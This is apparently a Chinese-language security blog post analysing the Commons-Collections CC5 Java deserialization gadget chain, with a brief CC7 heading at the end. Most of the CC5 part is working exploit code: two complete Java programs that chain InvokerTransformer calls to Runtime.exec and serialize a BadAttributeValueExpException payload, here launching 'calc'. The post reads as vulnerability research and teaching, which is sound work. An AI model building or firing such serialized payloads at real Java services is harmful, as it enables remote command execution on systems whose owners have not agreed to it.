---
layout: post
title: Commons-Collection CC5链7链
tags: Java
---

# CC5

## 链分析

```
/*
	Gadget chain:
        ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()

	Requires:
		commons-collections
 */
```

跟CC1的LazyMap链差不多,就是`LazyMap.get`的调用改成了`TiedMapEntry.toString`

```
public String toString() {
    return getKey() + "=" + getValue();
}

public Object getValue() {
	return map.get(key);
}
```

`toString`的`getValue`方法调用了`get`,这里的map是可以控制的

```
public TiedMapEntry(Map map, Object key) {
    super();
    this.map = map;
    this.key = key;
}
```

 简单构造一下

```
package org.example;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

public class CC5 {

    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, ClassNotFoundException, IOException, InvocationTargetException, InstantiationException, NoSuchFieldException {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap<>();
        map.put("value", "admin123");
        Map<Object, Object> layzMap = LazyMap.decorate(map, chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(layzMap, 1);
        tiedMapEntry.toString();
    }
}
```

找一个重写了`readObject`并且调用`toString`的,这里找到了`BadAttributeValueExpException`类

这里调用了`toString`方法

![1726634339750.jpg](\images\posts\Commons-Collection CC5链\1726634339750.jpg)

这里`readFields`读字段,然后从里面读`val`属性.看构造函数,`val`可控.这里就可以形成链

```
public BadAttributeValueExpException (Object val) {
    this.val = val == null ? null : val.toString();
}
```

## 编写EXP

构造函数执行时会调用`toString`方法,所以先随便写一个后面再通过反射改回来

```Java
package org.example;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

public class CC5 {

    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, ClassNotFoundException, IOException, InvocationTargetException, InstantiationException, NoSuchFieldException {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","admin123");
        Map<Object,Object> layzMap = LazyMap.decorate(map, chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(layzMap,1);
//        tiedMapEntry.toString();

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);  //随便写
        Class c = badAttributeValueExpException.getClass();
        Field declaredField = c.getDeclaredField("val");
        declaredField.setAccessible(true);
        declaredField.set(badAttributeValueExpException,tiedMapEntry);

//        serialize(badAttributeValueExpException);
        unserialize("CCTest1.txt");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("CCTest1.txt"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```

# CC7

## 链分析